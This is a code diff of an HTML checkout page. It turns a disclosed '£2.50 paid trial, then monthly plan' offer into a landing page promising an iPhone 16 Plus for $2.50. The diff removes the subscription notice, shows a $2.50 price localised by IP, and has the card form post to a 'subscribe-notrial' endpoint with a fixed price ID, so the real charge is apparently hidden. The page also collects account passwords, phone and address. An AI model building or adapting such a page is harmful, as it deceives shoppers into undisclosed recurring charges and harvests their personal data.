@@ -1,98 +1,134 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+
+<!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-FDQ6REQWS8');
+  </script>
+
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Secure Checkout — Intro Offer</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+  <title>Get The iPhone 16 Plus for $2.50!</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&display=swap" rel="stylesheet">
+
   <style>
-    :root{ --bg:#ffffff; --card:#f8f9fc; --text:#111; --muted:#555; --line:#ddd; --cta1:#ffd76b; --cta2:#ffb429; --radius:16px }
+    :root{
+      --bg:#ffffff; --card:#f8f9fc; --text:#111; --muted:#555; --line:#ddd; --cta1:#ffd76b; --cta2:#ffb429; --radius:16px;
+    }
     *{box-sizing:border-box}
-    body{ margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif; background:var(--bg); color:var(--text); display:flex; flex-direction:column; align-items:center; justify-content:flex-start; padding:18px 14px 40px; }
+    body{
+      margin:0; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif; 
+      background:var(--bg); color:var(--text);
+      display:flex; flex-direction:column; align-items:center; justify-content:flex-start;
+      padding:18px 14px 40px;
+    }
     .shell{ width:min(900px,100%); display:flex; flex-direction:column; gap:18px }
-    .card{ width:min(720px,100%); background:var(--card); border:1px solid var(--line); border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05); margin-inline:auto }
-    .title{ font-size:28px; font-weight:900; text-align:center; margin:4px 0 12px }
-    .sub{ text-align:center; color:#bbb; margin-top:-6px; margin-bottom:16px }
+    .card{
+      width:min(700px,100%); background:var(--card); border:1px solid var(--line);
+      border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05); margin-inline:auto;
+    }
+    .title{ font-size:28px; font-weight:900; text-align:center; margin:4px 0 14px }
+    .sub{ text-align:center; color:var(--muted); margin-top:-6px; margin-bottom:16px }
+    .img-wrap{ display:flex; justify-content:center; padding:10px 0 16px }
+    .img-wrap img{ width:min(360px,80%); height:auto; border-radius:18px; border:1px solid #eee; }
     .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
-    .input{ width:100%; padding:12px; border:1px solid #ccc; background:#fff; color:#111; border-radius:10px; font-size:16px }
-    .btn{ width:100%; border:none; color:#111; border-radius:12px; padding:12px 16px; font-weight:900; cursor:pointer; font-size:16px; background:linear-gradient(180deg,var(--cta1),var(--cta2)); box-shadow:0 8px 18px rgba(255,174,15,.25) }
+    .input{ width:100%; padding:12px; border:1px solid #ccc; background:#fff; color:#111; border-radius:10px; font-size:16px; }
+    .btn{
+      width:100%; border:none; color:#111; border-radius:12px; padding:12px 16px;
+      font-weight:900; cursor:pointer; font-size:16px; 
+      background:linear-gradient(180deg,var(--cta1),var(--cta2));
+      box-shadow:0 8px 18px rgba(255,174,15,.25);
+    }
     .btn-row{ display:flex; gap:12px; margin-top:12px }
-    .muted-btn{ background:#eee; color:#333; border:1px solid #ddd }
+    .muted-btn{ background:#eee; color:#333; border:1px solid #ddd; }
     .step{ display:none }
     .step[aria-hidden="false"]{ display:block }
-    .label{ font-weight:700; margin:4px 0 8px; font-size:14px; color:#333 }
-    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px }
-    .brands{ display:flex; justify-content:center; gap:12px; margin:14px 0 6px }
-    .brands img{ height:22px }
+    .label{font-weight:700; margin:4px 0 8px; font-size:14px; color:#333}
+    .el{ width:100%; background:#fff; color:#111; border:1px solid #ccc; border-radius:10px; padding:12px; }
+    .brands{display:flex; justify-content:center; gap:12px; margin:14px 0 6px}
+    .brands img{height:22px}
     .trust-text{ font-size:13px; color:#666; text-align:center; margin-top:12px }
-    #err{ width:100%; margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none }
-    #err[aria-hidden="false"]{ display:block }
-    .loading-overlay{ position:fixed; inset:0; background:rgba(255,255,255,.9); display:none; align-items:center; justify-content:center; flex-direction:column; z-index:9999; text-align:center }
+    #err{ width:100%; margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none; }
+    #err[aria-hidden="false"]{ display:block; }
+    .loading-overlay{ position:fixed; inset:0; background:rgba(255,255,255,.9); display:none; align-items:center; justify-content:center; flex-direction:column; z-index:9999; text-align:center; }
     .loading-overlay[aria-hidden="false"]{ display:flex }
-    .loading-box{ width:min(92vw,460px); background:#fff; border:1px solid #ddd; border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.08); padding:20px; text-align:center }
+    .loading-box{ width:min(92vw,460px); background:#fff; border:1px solid #ddd; border-radius:14px; box-shadow:0 6px 18px rgba(0,0,0,.08); padding:20px; text-align:center; }
     .loading-title{ font-weight:800; margin:2px 0 10px; color:#111 }
-    .progress-wrap{ width:100%; height:10px; background:#eee; border-radius:999px; overflow:hidden }
-    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg, var(--cta1), var(--cta2)); animation:loadingBar 2.2s ease-in-out infinite }
+    .progress-wrap{ width:100%; height:10px; background:#eee; border-radius:999px; overflow:hidden; }
+    .progress-bar{ width:0%; height:100%; background:linear-gradient(90deg, var(--cta1), var(--cta2)); animation: loadingBar 2.2s ease-in-out infinite; }
     @keyframes loadingBar{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }
-    .addr-grid{ display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:10px 0 0 }
-    .addr-grid .full{ grid-column:1/-1 }
+
+    /* Phone prefix + number layout */
+    .phone-wrap{ display:grid; grid-template-columns:140px 1fr; gap:8px; }
+    @media (max-width:520px){
+      .phone-wrap{ grid-template-columns:1fr; }
+    }
   </style>
 </head>
 <body>
+
+<!-- GoAffPro loader (keep this so the next page can track) -->
+<script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+
   <div class="shell">
 
     <!-- STEP 1 -->
     <section id="step1" class="card step" aria-hidden="false">
-      <h1 class="title">Secure your intro offer</h1>
-      <p class="sub">Create your account. You can cancel anytime.</p>
+      <h1 class="title">
+        Get The iPhone 16 Plus for <span id="priceHero" data-price> $2.50</span>!
+      </h1>
+      <p class="sub">Limited-time offer. Secure your new iPhone today!</p>
 
-      <div class="grid" style="margin-top:10px">
+      <div class="img-wrap">
+        <img src="Screenshot 2025-08-30 134339.png" alt="iPhone 16 Plus"/>
+      </div>
+
+      <div class="grid">
         <input class="input" id="nameInput" placeholder="Full name" autocomplete="name" required />
         <input class="input" id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" required />
-        <input class="input" id="passwordInput" type="password" placeholder="Create a password" autocomplete="new-password" required style="grid-column:1/-1" />
-        <input class="input" id="phoneInput" inputmode="tel" placeholder="Phone (for receipts / support)" autocomplete="tel" style="grid-column:1/-1" />
+        <!-- Password (left) + Phone (right) -->
+        <input class="input" id="passwordInput" type="password" placeholder="Create a password" autocomplete="new-password" required />
+        <div class="phone-wrap">
+          <select id="phonePrefix" class="input" aria-label="Country calling code"></select>
+          <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number" autocomplete="tel-national" />
+        </div>
       </div>
 
       <div class="btn-row">
         <button id="nextBtn" class="btn">Next step →</button>
       </div>
-      <p class="trust-text">We’ll never share your contact info. 100% privacy guaranteed.</p>
+      <p class="trust-text">We’ll never share your email. 100% privacy guaranteed.</p>
     </section>
 
     <!-- STEP 2 -->
     <section id="step2" class="card step" aria-hidden="true">
       <h2 class="title">Secure Payment</h2>
       <p class="sub">Your details are safe — powered by Stripe.</p>
-      <p class="sub" style="margin-top:-6px;color:#0b6b3a">
-        <strong>Today's charge:</strong> £2.50 paid trial. Your monthly plan starts after this succeeds.
-      </p>
 
-      <div class="addr-grid" aria-label="Billing address">
-        <input id="addr1" class="input full" placeholder="Address line 1" autocomplete="address-line1" required>
-        <input id="city" class="input" placeholder="City" autocomplete="address-level2" required>
-        <input id="region" class="input" placeholder="State / Region" autocomplete="address-level1" required>
-        <input id="postal" class="input" placeholder="ZIP / Postal code" autocomplete="postal-code" required>
-        <select id="country" class="input" required>
-          <option value="" selected disabled>Choose country</option>
-          <option value="US">United States</option>
-          <option value="GB">United Kingdom</option>
-          <option value="CA">Canada</option>
-          <option value="AU">Australia</option>
-          <option value="IE">Ireland</option>
-          <option value="NZ">New Zealand</option>
-          <option value="DE">Germany</option>
-          <option value="FR">France</option>
-          <option value="NL">Netherlands</option>
-          <option value="SE">Sweden</option>
-          <option value="NO">Norway</option>
-          <option value="DK">Denmark</option>
-          <option value="FI">Finland</option>
-          <option value="IT">Italy</option>
-          <option value="ES">Spain</option>
-          <option value="GE">Georgia</option>
-          <option value="CO">Colombia</option>
-        </select>
+      <!-- NEW: Billing address -->
+      <div class="label">Street address</div>
+      <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Street address"/>
+
+      <div class="grid" style="margin-top:10px">
+        <div>
+          <div class="label">City</div>
+          <input id="billingCity" class="input" autocomplete="address-level2" placeholder="City"/>
+        </div>
+        <div>
+          <div class="label">Post Code</div>
+          <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Post Code"/>
+        </div>
       </div>
+
+      <div class="label" style="margin-top:10px">Country</div>
+      <select id="billingCountry" class="input" autocomplete="country"></select>
+
+      <div id="gpay-button" style="margin-top:8px"></div>
 
       <div class="label">Card number</div>
       <div id="card-number" class="el"></div>
@@ -111,7 +147,7 @@
 
       <div class="btn-row">
         <button id="backBtn" class="btn muted-btn">← Back</button>
-        <button class="btn" id="payNow">Pay £2.50 Securely</button>
+        <button class="btn" id="payNow">Pay <span id="priceButton" data-price>$2.50</span> Securely</button>
       </div>
 
       <div class="brands">
@@ -137,258 +173,249 @@
   <!-- Stripe.js -->
   <script src="https://js.stripe.com/v3"></script>
   <script>
-    // NOTE: If you host the HTML on a different origin than the Node backend,
-    // define window.API_BASE_FALLBACK earlier on the page (in a separate <script> block),
-    // e.g. window.API_BASE_FALLBACK = "https://YOUR-SERVICE.onrender.com";
+    /* ---------- Step navigation ---------- */
 
-    const API_BASES = [location.origin, (window.API_BASE_FALLBACK || "").replace(/\/$/,"")].filter(Boolean);
-    async function apiFetch(path, init){
-      let lastErr;
-      for (const base of API_BASES){
-        try{
-          const res = await fetch(base + path, init);
-          if (!res.ok && base === location.origin && API_BASES.length > 1 && res.status === 404) {
-            lastErr = new Error("Not found on origin, retrying fallback…");
-            continue;
-          }
-          return res;
-        }catch(e){ lastErr = e; }
-      }
-      throw lastErr || new Error("Network error");
-    }
+    /* NEW: API base for local file testing */
+    const API_BASE = (() => {
+      if (location.protocol.startsWith('http')) return location.origin;
+      return "http://localhost:10000"; // change if your dev server runs elsewhere
+    })();
 
-    // ---------- Step navigation ----------
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const nameInput = document.getElementById('nameInput');
-    const emailInput = document.getElementById('emailInput');
-    const passwordInput = document.getElementById('passwordInput');
-    const phoneInput = document.getElementById('phoneInput');
+    const step1=document.getElementById('step1'),step2=document.getElementById('step2');
+    const nameInput=document.getElementById('nameInput');
+    const emailInput=document.getElementById('emailInput');
+    const passwordInput=document.getElementById('passwordInput');
+    // NEW phone inputs
+    const phonePrefix=document.getElementById('phonePrefix');
+    const phoneNumber=document.getElementById('phoneNumber');
 
-    // Country & phone helpers
-    const countrySelect = document.getElementById('country');
-    const cityInput = document.getElementById('city');
-    const regionInput = document.getElementById('region');
-    const postalInput = document.getElementById('postal');
+    // NEW: billing address refs
+    const billingStreet   = document.getElementById('billingStreet');
+    const billingCity     = document.getElementById('billingCity');
+    const billingPostcode = document.getElementById('billingPostcode');
+    const billingCountry  = document.getElementById('billingCountry');
 
-    const E164_BY_ISO = {
-      US: '+1', CA: '+1', GB: '+44', IE: '+353', AU: '+61', NZ: '+64',
-      DE: '+49', FR: '+33', NL: '+31', SE: '+46', NO: '+47', DK: '+45',
-      FI: '+358', IT: '+39', ES: '+34', GE: '+995', CO: '+57'
-    };
-
-    let geoLocked = false;
-    let lastAutoPrefix = null;
-
-    function setCountryOption(iso2, label) {
-      const val = (iso2 || '').toUpperCase();
-      if (!val) return;
-      let opt = [...countrySelect.options].find(o => o.value === val);
-      if (!opt) {
-        opt = document.createElement('option');
-        opt.value = val;
-        opt.textContent = label || val;
-        countrySelect.appendChild(opt);
-      }
-      countrySelect.value = val;
-    }
-
-    function maybeSetPhonePrefix(prefix) {
-      if (!prefix) return;
-      const v = phoneInput.value.trim();
-      const looksManual = v && !v.startsWith(lastAutoPrefix || '') && v.replace(/\D/g,'').length > 3;
-      if (looksManual) return;
-      if (!v || v[0] !== '+') {
-        phoneInput.value = prefix + (v.replace(/^\+/, '') ? (' ' + v.replace(/^\+/, '')) : '');
-      } else if (lastAutoPrefix && v.startsWith(lastAutoPrefix)) {
-        phoneInput.value = prefix + v.slice(lastAutoPrefix.length);
-      }
-      lastAutoPrefix = prefix;
-    }
-
-    countrySelect.addEventListener('change', () => {
-      const iso = countrySelect.value.toUpperCase();
-      const prefix = E164_BY_ISO[iso] || lastAutoPrefix || '';
-      if (prefix) {
-        const raw = phoneInput.value.trim();
-        if (!raw || raw.replace(/\D/g,'').length <= 3 || (lastAutoPrefix && raw.startsWith(lastAutoPrefix))) {
-          maybeSetPhonePrefix(prefix);
-        }
-      }
-    });
-
-    async function geoFromIpapi() {
-      const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
-      if (!r.ok) throw new Error('ipapi failed');
-      const j = await r.json();
-      return {
-        iso: (j.country || '').toUpperCase(),
-        country: j.country_name || '',
-        city: j.city || '',
-        region: j.region || '',
-        postal: j.postal || '',
-        dial: j.country_calling_code || ''
-      };
-    }
-    async function geoFromIpwho() {
-      const r = await fetch('https://ipwho.is/?fields=country,country_code,region,city,postal,calling_code', { cache: 'no-store' });
-      if (!r.ok) throw new Error('ipwho failed');
-      const j = await r.json();
-      if (j && j.success === false) throw new Error('ipwho bad');
-      return {
-        iso: (j.country_code || '').toUpperCase(),
-        country: j.country || '',
-        city: j.city || '',
-        region: j.region || '',
-        postal: j.postal || '',
-        dial: j.calling_code ? ('+' + String(j.calling_code)) : ''
-      };
-    }
-
-    async function setGeoDefaults() {
-      if (geoLocked) return;
-      try {
-        let g = null;
-        try { g = await geoFromIpapi(); } catch {}
-        if (!g || !g.iso) { try { g = await geoFromIpwho(); } catch {} }
-        if (!g || !g.iso) throw new Error('no geo');
-
-        setCountryOption(g.iso, g.country);
-        if (!cityInput.value && g.city) cityInput.value = g.city;
-        if (!regionInput.value && g.region) regionInput.value = g.region;
-        if (!postalInput.value && g.postal) postalInput.value = g.postal;
-
-        const prefix = g.dial || E164_BY_ISO[g.iso] || '';
-        maybeSetPhonePrefix(prefix);
-
-        geoLocked = true;
-      } catch {
-        const m = (navigator.language || '').match(/-([A-Z]{2})$/i);
-        const guessIso = m ? m[1].toUpperCase() : '';
-        if (guessIso) {
-          setCountryOption(guessIso);
-          const prefix = E164_BY_ISO[guessIso] || '';
-          maybeSetPhonePrefix(prefix);
-          geoLocked = true;
-        }
-      }
-    }
-
+    // Create/confirm account on your Render server before moving to payment
     async function ensureAccount(){
-      const email = (emailInput.value||'').trim();
-      const password = passwordInput.value||'';
-      if(!email || !password) throw new Error('Please enter email and password.');
-      const res = await apiFetch('/api/register', {
-        method:'POST', headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({ email, password, phone: (phoneInput.value||'').trim() })
+      const email=(emailInput.value||'').trim();
+      const password=passwordInput.value||'';
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const prefix=(phonePrefix?.value||'+1').trim();
+      const phone = rawPhone ? `${prefix}${rawPhone}` : '';
+      if(!email || !password) throw new Error("Please enter email and password.");
+      const res=await fetch(`${API_BASE}/api/register`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({email,password,phone})
       });
-      if (res.status === 201) return true;
-      const data = await res.json().catch(()=>({}));
-      if (res.status === 400 && /exists/i.test(data?.error||'')) return true;
-      throw new Error(data?.error || 'Could not create account');
+      if(res.status===201) return true;
+      let data={}; try{ data=await res.json(); }catch{}
+      if(res.status===400 && /exists/i.test(data?.error||"")) return true;
+      throw new Error(data?.error||"Could not create account");
     }
 
-    document.getElementById('nextBtn').onclick = async () => {
-      if(!nameInput.value||!emailInput.value||!passwordInput.value){ alert('Please enter your details'); return; }
-      try { await ensureAccount(); } catch(e){ alert(e.message||'Problem creating your account.'); return; }
-      localStorage.setItem('checkout_name', nameInput.value);
-      localStorage.setItem('checkout_email', emailInput.value);
-      step1.setAttribute('aria-hidden','true');
-      step2.setAttribute('aria-hidden','false');
-      setGeoDefaults();
-      window.scrollTo({top:0,behavior:'smooth'});
-    };
-    document.getElementById('backBtn').onclick = () => {
-      step1.setAttribute('aria-hidden','false');
-      step2.setAttribute('aria-hidden','true');
-      window.scrollTo({top:0,behavior:'smooth'});
-    };
-
-    // ---------- Stripe (matches server's £2.50 trial) ----------
-    const TRIAL_INTENT_PATH = '/api/stripe/trial-charge-intent';
-    const START_MONTHLY_PATH = '/api/stripe/start-monthly-after-trial';
-    const PUBLISHABLE_KEY = 'pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q';
-
-    const stripe = Stripe(PUBLISHABLE_KEY);
-    const elements = stripe.elements();
-    const cardNumber = elements.create('cardNumber');
-    const cardExpiry = elements.create('cardExpiry');
-    const cardCvc = elements.create('cardCvc');
-    cardNumber.mount('#card-number');
-    cardExpiry.mount('#card-expiry');
-    cardCvc.mount('#card-cvc');
-
-    const $err = document.getElementById('err');
-    const overlay = document.getElementById('loading-overlay');
-    function showError(m){ $err.textContent=m; $err.style.display='block'; }
-    function hideError(){ $err.textContent=''; $err.style.display='none'; }
-    function showLoading(){ overlay.setAttribute('aria-hidden','false'); }
-    function hideLoading(){ overlay.setAttribute('aria-hidden','true'); }
-
-    function requiredFilled(){
-      const a = document.getElementById('addr1').value.trim();
-      const c = document.getElementById('city').value.trim();
-      const r = document.getElementById('region').value.trim();
-      const p = document.getElementById('postal').value.trim();
-      const co = document.getElementById('country').value.trim();
-      return a && c && r && p && co;
-    }
-
-    document.getElementById('payNow').onclick = async () => {
-      hideError();
-      if (!requiredFilled()){ showError('Please complete your billing address.'); return; }
-      showLoading();
+    document.getElementById('nextBtn').onclick=async()=>{ 
+      if(!nameInput.value||!emailInput.value||!passwordInput.value){alert("Please enter your details");return}
       try{
-        const address = {
-          line1: document.getElementById('addr1').value.trim(),
-          city: document.getElementById('city').value.trim(),
-          state: document.getElementById('region').value.trim(),
-          postal_code: document.getElementById('postal').value.trim(),
-          country: document.getElementById('country').value.trim()
-        };
-
-        // 1) Create PaymentMethod with full billing_details (helps issuer auth)
-        const pmRes = await stripe.createPaymentMethod({
-          type:'card',
-          card: cardNumber,
-          billing_details: {
-            name: nameInput.value || undefined,
-            email: emailInput.value || undefined,
-            phone: phoneInput.value?.trim() || undefined,
-            address
-          }
-        });
-        if (pmRes.error) throw new Error(pmRes.error.message);
-        const paymentMethodId = pmRes.paymentMethod.id;
-
-        // 2) Ask server for the £2.50 trial PaymentIntent
-        const r1 = await apiFetch(TRIAL_INTENT_PATH, {
-          method:'POST', headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({ paymentMethodId, name: nameInput.value, email: emailInput.value })
-        });
-        const d1 = await r1.json();
-        if (!r1.ok || !d1.clientSecret) throw new Error(d1.error || 'Failed to create intro charge.');
-
-        // 3) Confirm intro charge (3DS may occur here)
-        const conf = await stripe.confirmCardPayment(d1.clientSecret);
-        if (conf.error) throw new Error(conf.error.message);
-        if (!(conf.paymentIntent && conf.paymentIntent.status === 'succeeded')) throw new Error('Payment not completed');
-
-        // 4) Start monthly subscription after success
-        const r2 = await apiFetch(START_MONTHLY_PATH, {
-          method:'POST', headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({ paymentIntentId: conf.paymentIntent.id })
-        });
-        const d2 = await r2.json();
-        if (!r2.ok) throw new Error(d2.error || 'Failed to start subscription');
-
-        // 5) Done
-        window.location.href = 'thankyou-iphone.html';
-      }catch(err){
-        showError(err.message || 'Payment failed');
-      }finally{
-        hideLoading();
+        await ensureAccount();
+      }catch(e){
+        alert(e.message||"Problem creating your account. Please try again.");
+        return;
       }
+      localStorage.setItem("checkout_name",nameInput.value);
+      localStorage.setItem("checkout_email",emailInput.value);
+      step1.setAttribute("aria-hidden","true");
+      step2.setAttribute("aria-hidden","false");
+    };
+    document.getElementById('backBtn').onclick=()=>{ 
+      step1.setAttribute("aria-hidden","false");step2.setAttribute("aria-hidden","true");
+    };
+
+    /* ---------- Calling code data + helper for phone prefix ---------- */
+    const CALLING_CODES = {
+      US: { code: '+1',  name: 'United States' },
+      CA: { code: '+1',  name: 'Canada' },
+      GB: { code: '+44', name: 'United Kingdom' },
+      IE: { code: '+353',name: 'Ireland' },
+      AU: { code: '+61', name: 'Australia' },
+      NZ: { code: '+64', name: 'New Zealand' },
+      DE: { code: '+49', name: 'Germany' },
+      FR: { code: '+33', name: 'France' },
+      ES: { code: '+34', name: 'Spain' },
+      IT: { code: '+39', name: 'Italy' },
+      NL: { code: '+31', name: 'Netherlands' },
+      SE: { code: '+46', name: 'Sweden' },
+      NO: { code: '+47', name: 'Norway' },
+      DK: { code: '+45', name: 'Denmark' },
+      FI: { code: '+358',name: 'Finland' },
+      BE: { code: '+32', name: 'Belgium' },
+      AT: { code: '+43', name: 'Austria' },
+      CH: { code: '+41', name: 'Switzerland' },
+      PT: { code: '+351',name: 'Portugal' },
+      PL: { code: '+48', name: 'Poland' },
+      RO: { code: '+40', name: 'Romania' },
+      CZ: { code: '+420',name: 'Czechia' },
+      SK: { code: '+421',name: 'Slovakia' },
+      HU: { code: '+36', name: 'Hungary' },
+      GR: { code: '+30', name: 'Greece' }
+    };
+    function buildPrefixOptions(selectEl, prefer) {
+      if(!selectEl) return;
+      selectEl.innerHTML = "";
+      const entries = Object.entries(CALLING_CODES);
+      if (prefer && CALLING_CODES[prefer]) {
+        const data = CALLING_CODES[prefer];
+        selectEl.append(new Option(`${data.code} — ${data.name}`, data.code, true, true));
+      }
+      const seen = new Set([prefer ? CALLING_CODES[prefer]?.code : '']);
+      for (const [cc, data] of entries) {
+        if (prefer === cc) continue;
+        const key = `${data.code}|${data.name}`;
+        if (seen.has(key)) continue;
+        selectEl.append(new Option(`${data.code} — ${data.name}`, data.code));
+        seen.add(key);
+      }
+      if (!selectEl.value) selectEl.value = '+1';
+    }
+
+    /* ---------- Currency & geo by IP (display + prefill) ---------- */
+    (function setCurrencyByIP(){
+      const EU = new Set([
+        'AT','BE','BG','HR','CY','CZ','DK','EE','FI','FR','DE','GR','HU','IE','IT',
+        'LV','LT','LU','MT','NL','PL','PT','RO','SK','SI','ES','SE'
+      ]);
+      function symbolFor(cc){
+        if(cc==='US') return '$';
+        if(cc==='GB' || cc==='UK') return '£';
+        if(EU.has(cc)) return '€';
+        return '$';
+      }
+      function applyPriceSymbol(symbol){
+        document.querySelectorAll('[data-price]').forEach(el=>{
+          el.textContent = `${symbol}2.50`;
+        });
+        document.title = `Get The iPhone 16 Plus for ${symbol}2.50!`;
+      }
+
+      // Seed immediate fallbacks
+      applyPriceSymbol('$');
+      try { buildPrefixOptions(phonePrefix, 'US'); } catch {}
+
+      // Helper: fill country select with a single focused option + common fallbacks
+      function initCountrySelect(code, name) {
+        if (!billingCountry) return;
+        const opts = [];
+        function add(value, label, selected=false){
+          const o = new Option(label, value, selected, selected);
+          opts.push(o);
+        }
+        // Primary detected country first
+        if (code) add(code.toUpperCase(), `${name || code.toUpperCase()}`, true);
+        // A few commons as alternates
+        [['US','United States'],['GB','United Kingdom'],['IE','Ireland'],['DE','Germany'],['FR','France'],['ES','Spain'],['IT','Italy'],['NL','Netherlands'],['AU','Australia'],['CA','Canada']].forEach(([c,n])=>{
+          if (!code || c.toUpperCase()!==code.toUpperCase()) add(c, n, false);
+        });
+        billingCountry.innerHTML='';
+        opts.forEach(o=>billingCountry.appendChild(o));
+      }
+
+      fetch('https://ipapi.co/json/')
+        .then(r => r.ok ? r.json() : Promise.reject())
+        .then(data => {
+          const cc = ((data && (data.country || data.country_code)) || 'US').toUpperCase();
+          applyPriceSymbol(symbolFor(cc));
+
+          // Prefer the exact calling code returned by the API (covers countries not in your static list)
+          const apiCalling = (data && data.country_calling_code) || '';
+          const apiName    = (data && data.country_name) || '';
+          const city       = (data && data.city) || '';
+          if (apiCalling) {
+            try {
+              phonePrefix.innerHTML = '';
+              phonePrefix.append(new Option(`${apiCalling} — ${apiName || 'Your country'}`, apiCalling, true, true));
+              const seen = new Set([apiCalling]);
+              for (const [, info] of Object.entries(CALLING_CODES)) {
+                if (seen.has(info.code)) continue;
+                phonePrefix.append(new Option(`${info.code} — ${info.name}`, info.code));
+                seen.add(info.code);
+              }
+            } catch {}
+          } else {
+            try { buildPrefixOptions(phonePrefix, cc); } catch {}
+          }
+
+          // NEW: prefill address Country/City
+          try { initCountrySelect(cc, apiName); } catch {}
+          try { if (city && !billingCity.value) billingCity.value = city; } catch {}
+        })
+        .catch(() => {
+          try {
+            const loc = Intl.DateTimeFormat().resolvedOptions().locale || 'en-US';
+            const cc = (loc.split('-')[1] || 'US').toUpperCase();
+            applyPriceSymbol(symbolFor(cc));
+            try { buildPrefixOptions(phonePrefix, cc); } catch {}
+            try { initCountrySelect(cc, cc); } catch {}
+          } catch { /* keep defaults */ }
+        });
+    })();
+
+    /* ---------- Stripe logic (unchanged flow; enhanced billing_details) ---------- */
+    const SUBSCRIBE_URL="https://charmr-jfmc.onrender.com/api/stripe/subscribe-notrial";
+    const PUBLISHABLE_KEY="pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+    const FIXED_PRICE_ID="price_1Rzdp0EJXIhiKzYGlVxHGH7W";
+    const stripe=Stripe(PUBLISHABLE_KEY),elements=stripe.elements();
+    const cardNumber=elements.create("cardNumber"),cardExpiry=elements.create("cardExpiry"),cardCvc=elements.create("cardCvc");
+    cardNumber.mount("#card-number");cardExpiry.mount("#card-expiry");cardCvc.mount("#card-cvc");
+    const $err=document.getElementById("err"),overlay=document.getElementById("loading-overlay");
+    function showError(m){$err.textContent=m;$err.style.display="block"}
+    function hideError(){$err.textContent="";$err.style.display="none"}
+    function showLoading(){overlay.setAttribute("aria-hidden","false")}
+    function hideLoading(){overlay.setAttribute("aria-hidden","true")}
+    document.getElementById("payNow").onclick=async()=>{
+      hideError();showLoading();
+
+      // Build phone from prefix + digits only
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const prefix=(phonePrefix?.value||'+1').trim();
+      const fullPhone = rawPhone ? `${prefix}${rawPhone}` : undefined;
+
+      // Collect billing address for Stripe billing_details.address
+      const addr = {
+        line1: (billingStreet?.value || '').trim() || undefined,
+        city: (billingCity?.value || '').trim() || undefined,
+        postal_code: (billingPostcode?.value || '').trim() || undefined,
+        country: (billingCountry?.value || '').trim() || undefined, // ISO 2-letter
+      };
+
+      const pm=await stripe.createPaymentMethod({
+        type:"card",
+        card:cardNumber,
+        billing_details:{
+          name:nameInput.value || undefined,
+          email:emailInput.value || undefined,
+          phone: fullPhone,                // <-- now included
+          address: addr                    // <-- full address sent
+        }
+      });
+
+      if(pm.error){hideLoading();showError(pm.error.message);return}
+
+      const res=await fetch(SUBSCRIBE_URL,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+          priceId:FIXED_PRICE_ID,
+          paymentMethodId:pm.paymentMethod.id,
+          name:nameInput.value,
+          email:emailInput.value
+          // Address/phone live on the PaymentMethod's billing_details above
+        })
+      });
+      const data=await res.json();
+      if(!data.clientSecret){hideLoading();showError("Payment failed");return}
+      const conf=await stripe.confirmCardPayment(data.clientSecret);
+      if(conf.error){hideLoading();showError(conf.error.message);return}
+      if(conf.paymentIntent&&conf.paymentIntent.status==="succeeded"){window.location.href="thankyou-iphone.html"}else{hideLoading();showError("Payment not completed")}
     };
   </script>
 </body>
